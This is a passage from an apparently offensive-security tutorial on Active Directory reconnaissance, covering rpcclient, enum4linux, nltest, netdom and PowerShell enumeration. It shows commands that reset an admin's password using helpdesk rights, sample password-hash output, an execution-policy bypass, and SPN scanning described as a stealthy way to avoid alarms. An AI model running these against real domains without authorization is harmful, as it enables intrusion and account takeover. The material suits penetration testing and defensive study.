<section id="enumerate-specific-user-computer-information-by-rid">
<h4>Enumerate specific User/ computer information by RID<a class="headerlink" href="#enumerate-specific-user-computer-information-by-rid" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; queryuser 0x3601</span>
<span class="go">User Name   :   dummy_s</span>
<span class="go">Full Name   :   Dummy User</span>
<span class="go">Home Drive  :</span>
<span class="go">Dir Drive   :</span>
<span class="go">Profile Path:</span>
<span class="go">Logon Script:</span>
<span class="go">Description :   E 5.5.2008 Admin</span>
<span class="go">Workstations:</span>
<span class="go">Comment     :</span>
<span class="go">Logon Time               :      Tue, 24 Jan 2017 19:28:14 IST</span>
<span class="go">Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST</span>
<span class="go">Kickoff Time             :      Thu, 14 Sep 30828 08:18:05 IST</span>
<span class="go">Password last set Time   :      Fri, 21 Nov 2008 02:34:34 IST</span>
<span class="go">Password can change Time :      Fri, 21 Nov 2008 02:34:34 IST</span>
<span class="go">Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST</span>
</pre></div>
</div>
</section>
<section id="domain-password-policy">
<h4>Domain Password Policy<a class="headerlink" href="#domain-password-policy" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; getdompwinfo</span>
<span class="go">min_password_length: 8</span>
<span class="go">password_properties: 0x00000000</span>
</pre></div>
</div>
</section>
<section id="user-password-policies">
<h4>User password policies<a class="headerlink" href="#user-password-policies" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; getusrdompwinfo 0x3601</span>
<span class="go">min_password_length: 8</span>
<span class="go">&amp;info.password_properties: 0x433e6584 (1128162692)</span>
<span class="go">0: DOMAIN_PASSWORD_COMPLEX</span>
<span class="go">0: DOMAIN_PASSWORD_NO_ANON_CHANGE</span>
<span class="go">1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE</span>
<span class="go">0: DOMAIN_PASSWORD_LOCKOUT_ADMINS</span>
<span class="go">0: DOMAIN_PASSWORD_STORE_CLEARTEXT</span>
<span class="go">0: DOMAIN_REFUSE_PASSWORD_CHANGE</span>
</pre></div>
</div>
</section>
<section id="local-users">
<h4>Local Users<a class="headerlink" href="#local-users" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">lsaenumsid</span>
<span class="go">S-1-5-21-1971769256-327852233-3012798916-1014 Example\ftp_user (1)</span>
<span class="go">S-1-5-21-1971769256-327852233-3012798916-1000 Example\example_user (1)</span>
</pre></div>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">lookupsid S-1-5-21-1971769256-327852233-3012798916-1014</span>
<span class="go">S-1-5-21-1971769256-327852233-3012798916-1014 Example\ftp_user (1)</span>
</pre></div>
</div>
</section>
<section id="reset-ad-user-password">
<h4>Reset AD user password<a class="headerlink" href="#reset-ad-user-password" title="Link to this heading"></a></h4>
<p>As Mubix explained in <a class="reference external" href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">Reset AD User Password with Linux</a>. Often we have the credentials of limited administrative accounts such as IT or helpdesk. Sometimes, These accounts have an ability reset the password. This can be achieved in by using rpcclient in linux box provided smbclient and pass-the-hash package should be installed.</p>
<p>setuserinfo2 command can be used in order to change the password.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; setuserinfo2</span>
<span class="go">Usage: setuserinfo2 username level password [password_expired]</span>
<span class="go">result was NT_STATUS_INVALID_PARAMETER</span>
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>we won’t be able to change the password of users with AdminCount = 1 (Domain Admins and other higher privileged accounts).</p>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; setuserinfo2 ima-domainadmin 23 &#39;ASDqwe123&#39;</span>
<span class="go">result: NT_STATUS_ACCESS_DENIED</span>
<span class="go">result was NT_STATUS_ACCESS_DENIED</span>
<span class="go">rpcclient $&gt;</span>
</pre></div>
</div>
<p>Users having alternate admin accounts can be easily targeted.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; setuserinfo2 adminuser 23 &#39;ASDqwe123&#39;</span>
<span class="go">rpcclient $&gt;</span>
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The number 23 came from <a class="reference external" href="https://msdn.microsoft.com/en-us/library/cc245617.aspx">MSDN article USER_INFORMATION_CLASS</a>.  The SAMPR_USER_INTERNAL4_INFORMATION structure holds all attributes of a user, along with an encrypted password.</p>
</div>
<p>This can be done using the net command as well but we need to install the samba-common-bin in our machine.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">root@kali:~# </span>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span>adminuser<span class="w"> </span>-U<span class="w"> </span>helpdesk<span class="w"> </span>-S<span class="w"> </span><span class="m">192</span>.168.80.10
<span class="go">Enter new password for adminuser:</span>
<span class="go">Enter helpdesk&#39;s password:</span>
<span class="gp">root@kali:~#</span>
</pre></div>
</div>
</section>
</section>
<section id="enum4linux">
<h3>Enum4linux<a class="headerlink" href="#enum4linux" title="Link to this heading"></a></h3>
<p>Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com).</p>
<section id="usage">
<h4>Usage<a class="headerlink" href="#usage" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Usage: ./enum4linux.pl [options] ip</span>

<span class="go">Options are (like &quot;enum&quot;):</span>
<span class="go">    -U        get userlist</span>
<span class="go">    -M        get machine list*</span>
<span class="go">    -S        get sharelist</span>
<span class="go">    -P        get password policy information</span>
<span class="go">    -G        get group and member list</span>
<span class="go">    -d        be detailed, applies to -U and -S</span>
<span class="go">    -u user   specify username to use (default &quot;&quot;)</span>
<span class="go">    -p pass   specify password to use (default &quot;&quot;)</span>


<span class="go">Additional options:</span>
<span class="go">   -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).</span>
<span class="go">             This option is enabled if you don&#39;t provide any other options.</span>
<span class="go">   -h        Display this help message and exit</span>
<span class="go">   -r        enumerate users via RID cycling</span>
<span class="go">   -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)</span>
<span class="go">   -K n      Keep searching RIDs until n consecutive RIDs don&#39;t correspond to a username.  Implies RID range ends at 999999. Useful against DCs.</span>
<span class="go">   -l        Get some (limited) info via LDAP 389/TCP (for DCs only)</span>
<span class="go">   -s file   brute force guessing for share names</span>
<span class="go">   -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)</span>
<span class="go">             Used to get sid with &quot;lookupsid known_username&quot;</span>
<span class="go">             Use commas to try several users: &quot;-k admin,user1,user2&quot;</span>
<span class="go">   -o        Get OS information</span>
<span class="go">   -i        Get printer information</span>
<span class="go">   -w wrkg   Specify workgroup manually (usually found automatically)</span>
<span class="go">   -n        Do an nmblookup (similar to nbtstat)</span>
<span class="go">   -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)</span>
</pre></div>
</div>
</section>
<section id="example">
<h4>Example<a class="headerlink" href="#example" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">enum4linux -P -d xxxx.abcxxx.net -u mluxxxx -p threxxxx 10.0.65.103</span>
</pre></div>
</div>
</section>
</section>
<section id="active-directory-explorer-adexplorer">
<h3>Active Directory Explorer (ADExplorer)<a class="headerlink" href="#active-directory-explorer-adexplorer" title="Link to this heading"></a></h3>
<p>As per the TechNet article <a class="reference external" href="https://technet.microsoft.com/en-us/sysinternals/adexplorer.aspx">Active Directory Explorer (AD Explorer)</a> is an advanced Active Directory (AD) viewer and editor. We can use AD Explorer to easily navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object’s schema, and execute sophisticated searches that you can save and re-execute.</p>
<p><a class="reference external" href="https://www.blackhillsinfosec.com/?team=sally-vandeven">Sally Vandeven</a> has written a brilliant article on <a class="reference external" href="https://www.blackhillsinfosec.com/?p=5938">Domain Goodness – How I Learned to LOVE AD Explorer</a> Must read!</p>
</section>
<section id="jxplorer">
<h3>JXplorer<a class="headerlink" href="#jxplorer" title="Link to this heading"></a></h3>
<p><a class="reference external" href="http://jxplorer.org/">JXplorer</a> is a cross platform LDAP browser and editor. It is a standards compliant general purpose LDAP client that can be used to search, read and edit any standard LDAP directory, or any directory service with an LDAP or DSML interface.</p>
</section>
<section id="remote-server-administration-tools">
<h3>Remote Server Administration Tools<a class="headerlink" href="#remote-server-administration-tools" title="Link to this heading"></a></h3>
<p>Active Directory Domain Services (AD DS) Tools and Active Directory Lightweight Directory Services (AD LDS) Tools includes Active Directory Administrative Center; Active Directory Domains and Trusts; Active Directory Sites and Services; Active Directory Users and Computers; ADSI Edit; DCPromo.exe; LDP.exe; NetDom.exe; NTDSUtil.exe; RepAdmin.exe; Active Directory module for Windows PowerShell; DCDiag.exe; DSACLs.exe; DSAdd.exe; DSDBUtil.exe; DSMgmt.exe; DSMod.exe; DSMove.exe; DSQuery.exe; DSRm.exe; GPFixup.exe; KSetup.exe; KtPass.exe; NlTest.exe; NSLookup.exe; W32tm.exe.</p>
<p>Active Directory Administrative Center; Active Directory Domains and Trusts; Active Directory Sites and Services; Active Directory Users and Computers; ADSI Edit;  are GUI tools. These can be installed by installing <a class="reference external" href="https://support.microsoft.com/en-in/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems">Remote Server Administration Tools</a></p>
</section>
<section id="nltest">
<h3>nltest<a class="headerlink" href="#nltest" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://technet.microsoft.com/en-us/library/cc731935(v=ws.11).aspx">Nltest</a> is a command-line tool to perform network administrative tasks. We could figure out the Domain Controllers/ Domain Trusts using it. It is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the AD DS or the AD LDS server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT).</p>
<section id="id5">
<h4>Usage<a class="headerlink" href="#id5" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nltest /?</span>
<span class="go">Usage: nltest [/OPTIONS]</span>


<span class="go">   /SERVER:&lt;ServerName&gt; - Specify &lt;ServerName&gt;</span>

<span class="go">   /QUERY - Query &lt;ServerName&gt; netlogon service</span>
<span class="go">   /DCLIST:&lt;DomainName&gt; - Get list of DC&#39;s for &lt;DomainName&gt;</span>
<span class="go">   /DCNAME:&lt;DomainName&gt; - Get the PDC name for &lt;DomainName&gt;</span>
<span class="go">   /DSGETDC:&lt;DomainName&gt; - Call DsGetDcName /PDC /DS /DSP /GC /KDC /TIMESERV /GTIMESERV /WS /NETBIOS /DNS /IP /FORCE /WRITABLE /AVOIDSELF /LDAPONLY /BACKG /DS_6</span>
<span class="go">       /TRY_NEXT_CLOSEST_SITE /SITE:&lt;SiteName&gt; /ACCOUNT:&lt;AccountName&gt; /RET_DNS /RET_NETBIOS</span>
<span class="go">   /DNSGETDC:&lt;DomainName&gt; - Call DsGetDcOpen/Next/Close /PDC /GC /KDC /WRITABLE /LDAPONLY /FORCE /SITESPEC</span>
<span class="go">   /DSGETFTI:&lt;DomainName&gt; - Call DsGetForestTrustInformation /UPDATE_TDO</span>
<span class="go">   /DSGETSITE - Call DsGetSiteName</span>
<span class="go">   /DSGETSITECOV - Call DsGetDcSiteCoverage</span>
<span class="go">   /DSADDRESSTOSITE:[MachineName] - Call DsAddressToSiteNamesEx        /ADDRESSES:&lt;Address1,Address2,...&gt;</span>
<span class="go">   /PARENTDOMAIN - Get the name of the parent domain of this machine</span>
<span class="go">   /WHOWILL:&lt;Domain&gt;* &lt;User&gt; [&lt;Iteration&gt;] - See if &lt;Domain&gt; will log on &lt;User&gt;</span>
<span class="go">   /FINDUSER:&lt;User&gt; - See which trusted domain will log on &lt;User&gt;</span>
<span class="go">   /USER:&lt;UserName&gt; - Query User info on &lt;ServerName&gt;</span>
<span class="go">   /TIME:&lt;Hex LSL&gt; &lt;Hex MSL&gt; - Convert NT GMT time to ascii</span>
<span class="go">   /LOGON_QUERY - Query number of cumulative logon attempts</span>
<span class="go">   /DOMAIN_TRUSTS - Query domain trusts on &lt;ServerName&gt;</span>
<span class="go">       /PRIMARY /FOREST /DIRECT_OUT /DIRECT_IN /ALL_TRUSTS /V</span>
</pre></div>
</div>
<p><strong>Examples</strong></p>
</section>
<section id="verify-domain-controllers-in-a-domain">
<h4>Verify domain controllers in a domain<a class="headerlink" href="#verify-domain-controllers-in-a-domain" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nltest /dclist:xxx.example.net</span>
<span class="go">Get list of DCs in domain &#39;xxx.example.net&#39; from &#39;\\ABCDEFG.xxx.example.net&#39;.</span>
<span class="go">      ABCDEFG1.xxx.example.net        [DS] Site: XX-SriLanka</span>
<span class="go">      ABCDEFG2.xxx.example.net        [DS] Site: XX-India</span>
<span class="go">      ABCDEFG5.xxx.example.net [PDC]  [DS] Site: XX-Bangladesh</span>
<span class="go">The command completed successfully</span>
</pre></div>
</div>
</section>
<section id="advanced-information-about-users">
<h4>Advanced information about users<a class="headerlink" href="#advanced-information-about-users" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nltest /user:&quot;TestAdmin&quot;</span>
<span class="go">User: User1</span>
<span class="go">Rid: 0x3eb</span>
<span class="go">Version: 0x10002</span>
<span class="go">LastLogon: 2ee61c9a 01c0e947 = 5/30/2001 13:29:10</span>
<span class="go">PasswordLastSet: 9dad5428 01c0e577 = 5/25/2001 17:05:47</span>
<span class="go">AccountExpires: ffffffff 7fffffff = 9/13/30828 19:48:05</span>
<span class="go">PrimaryGroupId: 0x201</span>
<span class="go">UserAccountControl: 0x210</span>
<span class="go">CountryCode: 0x0</span>
<span class="go">CodePage: 0x0</span>
<span class="go">BadPasswordCount: 0x0</span>
<span class="go">LogonCount: 0x33</span>
<span class="go">AdminCount: 0x1</span>
<span class="go">SecurityDescriptor: 80140001 0000009c 000000ac 00000014 00000044 00300002 000000</span>
<span class="go">02 0014c002 01050045 00000101 01000000 00000000 0014c002 000f07ff 00000101 05000</span>
<span class="go">000 00000007 00580012 00000003 00240000 00020044 00000501 05000000 00000015 22cd</span>
<span class="go">b7b4 7112b3f1 2b3be507 000003eb 00180000 000f07ff 00000201 05000000 00000020 000</span>
<span class="go">00220 00140000 0002035b 00000101 01000000 00000000 00000201 05000000 00000020 00</span>
<span class="go">000220 00000201 05000000 00000020 00000220</span>
<span class="go"> AccountName: User1</span>
<span class="go">Groups: 00000201 00000007</span>
<span class="go">LmOwfPassword: fb890c9c 5c7e7e09 ee58593b d959c681</span>
<span class="go">NtOwfPassword: d82759cc 81a342ac df600c37 4e58a478</span>
<span class="go">NtPasswordHistory: 00011001</span>
<span class="go">LmPasswordHistory: 00010011</span>
<span class="go">The command completed successfully</span>
</pre></div>
</div>
</section>
<section id="determine-the-pdc-emulator-for-a-domain">
<h4>Determine the PDC emulator for a domain<a class="headerlink" href="#determine-the-pdc-emulator-for-a-domain" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nltest /dcname:fourthcoffee</span>
<span class="go">PDC for Domain fourthcoffee is \\fourthcoffee-dc-01</span>
<span class="go">The command completed successfully</span>
</pre></div>
</div>
</section>
<section id="show-trust-relationships-for-a-domain">
<h4>Show trust relationships for a domain<a class="headerlink" href="#show-trust-relationships-for-a-domain" title="Link to this heading"></a></h4>
<p>Returns a list of trusted domains. /Primary /Forest /Direct_Out /Direct_In /All_Trusts /v.</p>
<p>The following list shows the values that you can use to filter the list of domains.</p>
<ul class="simple">
<li><p>/Primary: Returns only the domain to which the computer account belongs.</p></li>
<li><p>/Forest: Returns only those domains that are in the same forest as the primary domain.</p></li>
<li><p>/Direct_Out: Returns only the domains that are explicitly trusted with the primary domain.</p></li>
<li><p>/Direct_In: Returns only the domains that explicitly trust the primary domain.</p></li>
<li><p>/All_Trusts: Returns all trusted domains.</p></li>
<li><p>/v: Displays verbose output, including any domain SIDs and GUIDs that are available.</p></li>
</ul>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nltest /domain_trusts</span>

<span class="go">List of domain trusts:</span>
<span class="go">   0: ABC abc.example.net (NT 5) (Forest: 17) (Direct Outbound) (Direct Inbound)</span>
<span class="go">   1: DEF def.example.net (NT 5) (Forest: 17) (Direct Outbound) (Direct Inbound)</span>
<span class="go">   2: IJK IJK.NET (NT 5) (Direct Inbound) ( Attr: 0x8 )</span>
<span class="go">   3: LMN LMH.net (NT 5) (Direct Outbound) ( Attr: 0x18 )</span>
<span class="go">   4: APP app.example.net (NT 5) (Forest: 17) (Direct Outbound) (Direct Inbound) ( Attr: 0x20 )</span>
</pre></div>
</div>
<p>Thanks to <a class="reference external" href="https://twitter.com/tanoybose">Tanoy Bose</a> for informing me about this. Cheers Bose.</p>
</section>
</section>
<section id="netdom">
<h3>netdom<a class="headerlink" href="#netdom" title="Link to this heading"></a></h3>
<p>netdom: netdom is a command-line tool that is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the Active Directory Domain Services (AD DS) server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT). More information available at <a class="reference external" href="https://technet.microsoft.com/en-us/library/cc835089(v=ws.11).aspx">Netdom query</a>.</p>
<section id="id6">
<h4>Usage<a class="headerlink" href="#id6" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">netdom query {/d: | /domain:}&lt;Domain&gt; [{/s: | /server:}&lt;Server&gt;] [{/ud: | /userd:}[&lt;Domain&gt;\]&lt;User&gt; {/pd: | /passwordd}{&lt;Password&gt;|*}] [/verify] [/reset] [/direct] {WORKSTATION|SERVER|DC|OU|PDC|FSMO|TRUST} [{/help | /?}]</span>

<span class="go">Specifies the type of list to generate. The following list shows the possible objects:</span>
<span class="go">WORKSTATION: Queries the domain for the list of workstations.</span>
<span class="go">SERVER: Queries the domain for the list of servers.</span>
<span class="go">DC   : Queries the domain for the list of domain controllers.</span>
<span class="go">OU   : Queries the domain for the list of OUs under which the user that you specify can create a computer object.</span>
<span class="go">PDC  : Queries the domain for the current primary domain controller.</span>
<span class="go">FSMO : Queries the domain for the current list of operations master role holders. These role holders are also known as flexible single master operations (FSMO).</span>
<span class="go">TRUST: Queries the domain for the list of its trusts.</span>
</pre></div>
</div>
<p><strong>Examples</strong></p>
</section>
<section id="dc">
<h4>DC<a class="headerlink" href="#dc" title="Link to this heading"></a></h4>
<p>Queries the domain for the list of workstations:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; netdom query /domain example.net DC</span>
<span class="go">List of domain controllers with accounts in the domain:</span>

<span class="go">xxxxDC12</span>
<span class="go">xxxxDC11</span>
<span class="go">xxxxDC04</span>
<span class="go">xxxxDC03</span>
<span class="go">The command completed successfully.</span>
</pre></div>
</div>
</section>
<section id="pdc">
<h4>PDC<a class="headerlink" href="#pdc" title="Link to this heading"></a></h4>
<p>Queries the domain for the current primary domain controller</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; netdom query /domain example.net PDC</span>
<span class="go">Primary domain controller for the domain:</span>

<span class="go">xxxxDC03.example.net</span>
<span class="go">The command completed successfully.</span>
</pre></div>
</div>
</section>
<section id="fsmo">
<h4>FSMO<a class="headerlink" href="#fsmo" title="Link to this heading"></a></h4>
<p>Queries the domain for the current list of operations master role holders.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; netdom query /domain example.net FSMO</span>
<span class="go">Schema master               xxxxDC03.example.net</span>
<span class="go">Domain naming master        xxxxDC03.example.net</span>
<span class="go">PDC                         xxxxDC03.example.net</span>
<span class="go">RID pool manager            xxxxDC03.example.net</span>
<span class="go">Infrastructure master       xxxxDC03.example.net</span>
<span class="go">The command completed successfully.</span>
</pre></div>
</div>
</section>
<section id="trust">
<h4>TRUST<a class="headerlink" href="#trust" title="Link to this heading"></a></h4>
<p>Queries the domain for the list of its trusts</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; netdom query /domain example.net TRUST</span>
<span class="go">Direction Trusted\Trusting domain      Trust type</span>
<span class="go">========= =======================      ==========</span>

<span class="go">&lt;-&gt;       xxxx.xxxxxx.net              Direct</span>
<span class="go">&lt;-&gt;       xxxx.example.net             Direct</span>
<span class="go">&lt;-&gt;       XX.XXXxXX.NET                Direct</span>
</pre></div>
</div>
</section>
<section id="ou">
<h4>OU<a class="headerlink" href="#ou" title="Link to this heading"></a></h4>
<p>Queries the domain for the list of OUs under which the user that you specify can create a computer object.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; netdom query /domain abc.example.net OU</span>
<span class="go">List of Organizational Units within which the specified user can create a</span>
<span class="go">machine account:</span>

<span class="go">OU=Domain Controllers,DC=abc,DC=example,DC=net</span>
<span class="go">OU=ABC-Admin,DC=abc,DC=example,DC=net</span>
<span class="go">OU=ServiceAccounts,OU=ABC-Admin,DC=abc,DC=example,DC=net</span>
<span class="go">OU=Users,OU=ABC-Admin,DC=abc,DC=example,DC=net</span>
<span class="go">OU=Groups,OU=ABC-Admin,DC=abc,DC=example,DC=net</span>
<span class="go">OU=Service Accounts,DC=abc,DC=example,DC=net</span>
<span class="go">OU=Servers,OU=ABC-Admin,DC=abc,DC=example,DC=net</span>
<span class="go">DC=abc,DC=example,DC=net</span>
<span class="go">The command completed successfully.</span>
</pre></div>
</div>
</section>
<section id="server-workstation">
<h4>SERVER/ WORKSTATION<a class="headerlink" href="#server-workstation" title="Link to this heading"></a></h4>
<p>Queries the domain for the list of servers/ workstations</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; netdom query /domain abc.example.net WORKSTATION</span>
<span class="go">List of workstations with accounts in the domain:</span>

<span class="go">ABCDC02      ( Workstation or Server )</span>
<span class="go">ABCDC01      ( Workstation or Server )</span>
<span class="go">ABCDC03      ( Workstation or Server )</span>
<span class="go">ABCDC04      ( Workstation or Server )</span>
<span class="go">BSKMACDB62   ( Workstation or Server )</span>

<span class="go">The command completed successfully.</span>

<span class="go">PS C:\&gt;</span>
</pre></div>
</div>
</section>
</section>
<section id="microsoft-active-directory-topology-diagrammer">
<h3>Microsoft Active Directory Topology Diagrammer<a class="headerlink" href="#microsoft-active-directory-topology-diagrammer" title="Link to this heading"></a></h3>
<p>The <a class="reference external" href="https://www.microsoft.com/en-in/download/details.aspx?id=13380">Microsoft Active Directory Topology Diagrammer</a> reads an Active Directory configuration using LDAP, and then automatically generates a Visio diagram of your Active Directory and /or your Exchange Server topology. The diagrams may include domains, sites, servers, organizational units, DFS-R, administrative groups, routing groups and connectors and can be changed manually in Visio if needed.</p>
</section>
<section id="ad-reconnaissance-with-powershell">
<h3>AD Reconnaissance with PowerShell<a class="headerlink" href="#ad-reconnaissance-with-powershell" title="Link to this heading"></a></h3>
<p>Sean Metcalf has written an awesome blog regarding the <a class="reference external" href="https://adsecurity.org/?p=2535">Active Directory Recon without Admin Rights</a> Most of the below stuff has been directly taken from his blog.</p>
<p>The enumeration of the active directory can also be carried forward using the normal domain user account. After gathering the domain user credentials launch the powershell by the following command on the command prompt.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">C:\&gt; Powershell -nop -exec bypass -noexit</span>
</pre></div>
</div>
<section id="forest-information">
<h4>Forest Information<a class="headerlink" href="#forest-information" title="Link to this heading"></a></h4>
<p>The current forest information can be gathered by using the following powershell code</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</span>

<span class="go">Name                  : ABC.com</span>
<span class="go">Sites                 : {Default-First-Site-Name}</span>
<span class="go">Domains               : {ABC.com}</span>
<span class="go">GlobalCatalogs        : {WIN-OK0HIC2UCIH.ABC.com}</span>
<span class="go">ApplicationPartitions : {DC=DomainDnsZones,DC=ABC,DC=com, DC=ForestDnsZones,DC=</span>
<span class="go">                        ABC,DC=com}</span>
<span class="go">ForestMode            : Windows2008R2Forest</span>
<span class="go">RootDomain            : ABC.com</span>
<span class="go">Schema                : CN=Schema,CN=Configuration,DC=ABC,DC=com</span>
<span class="go">SchemaRoleOwner       : WIN-OK0HIC2UCIH.ABC.com</span>
<span class="go">NamingRoleOwner       : WIN-OK0HIC2UCIH.ABC.com</span>
</pre></div>
</div>
</section>
<section id="domain-information">
<h4>Domain Information<a class="headerlink" href="#domain-information" title="Link to this heading"></a></h4>
<p>The current domain information to which the domain user is a part can be easily gathered by issuing the following powershell code</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span>

<span class="go">Forest                  : ABC.com</span>
<span class="go">DomainControllers       : {WIN-OK0HIC2UCIH.ABC.com}</span>
<span class="go">Children                : {}</span>
<span class="go">DomainMode              : Windows2008R2Domain</span>
<span class="go">Parent                  :</span>
<span class="go">PdcRoleOwner            : WIN-OK0HIC2UCIH.ABC.com</span>
<span class="go">RidRoleOwner            : WIN-OK0HIC2UCIH.ABC.com</span>
<span class="go">InfrastructureRoleOwner : WIN-OK0HIC2UCIH.ABC.com</span>
<span class="go">Name                    : ABC.com</span>
</pre></div>
</div>
</section>
<section id="forest-trusts">
<h4>Forest Trusts<a class="headerlink" href="#forest-trusts" title="Link to this heading"></a></h4>
<p>The trust between the present forests can be obtained by the following powershell code</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span><span class="nv">ForestRootDomain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>‘lab.adsecurity.org’
<span class="gp gp-VirtualEnv">([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(‘Forest’, $ForestRootDomain)</span><span class="go">))).GetAllTrustRelationships()</span>
</pre></div>
</div>
</section>
<section id="domain-trusts">
<h4>Domain Trusts<a class="headerlink" href="#domain-trusts" title="Link to this heading"></a></h4>
<p>The trusts relationship between the current domain and associated domain can be enumerated by the following</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span>
</pre></div>
</div>
<p>By gathering this information, An attacker can determine the attack surface area by residing in current domain.</p>
</section>
<section id="forest-global-catalogs">
<h4>Forest Global Catalogs<a class="headerlink" href="#forest-global-catalogs" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs</span>
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Typically every DC is also a Global catalog</p>
</div>
</section>
<section id="enterprise-services-without-scanning-of-network">
<h4>Enterprise Services without scanning of Network<a class="headerlink" href="#enterprise-services-without-scanning-of-network" title="Link to this heading"></a></h4>
<p>The services offered by the particular can also be identified using a simple powershell code. This type of information gathering is a stealthy approach as the service scanning of network may sometimes trigger the alarm. This type of approach is carried out by scanning the SPN (Service Principal Names). The information related to RDP enabled workstations, WinRM Enabled, Exchange servers, SQL servers etc. can be enumerated.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; get-adcomputer -filter {ServicePrincipalName -like “*TERMSRV*”} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,</span>
<span class="go">PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation</span>
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Both the computers and users (Service accounts) are to be targeted in order to determine the Enterprise services.</p>
</div>
</section>
<section id="spn-scanning">
<h4>SPN-Scanning<a class="headerlink" href="#spn-scanning" title="Link to this heading"></a></h4>
<p>Microsoft states that  “A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service.”
using the SPN scanning we identify the common servers such as IIS, SQL Server, and LDAP. Mostly, the convention of the SPN is formatted as SERVICE/HOST but sometimes the port no. associated is also given such as SERVICE/HOST:PORT.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">DNS/win2008k001.ABC.com   MSSQLSvc/win2008k002.ABC.com:1600</span>
</pre></div>
</div>
<p>The above example shows that if the Domain Account is used to run the DNS and SQL services on ABC.com the SPN entries would be the same.
Here we can use <a class="reference external" href="http://www.joeware.net/freetools/tools/adfind/">ADFind.exe</a> to list all the SQL server instances registered on a domain by using the code</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">C: &gt;Adfind.exe -f &quot;ServicePrincipalName=MSSQLSvc*&quot;</span>
</pre></div>
</div>
<p>we can also use setspn.exe (comes with the windows server 2008) can be used to lookup the SPNs for a particular user.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">C: &gt;setspn.exe -l &quot;UserName&quot;</span>
</pre></div>
</div>
</section>
<section id="spn-scanning-using-powershell">
<h4>SPN Scanning using Powershell<a class="headerlink" href="#spn-scanning-using-powershell" title="Link to this heading"></a></h4>
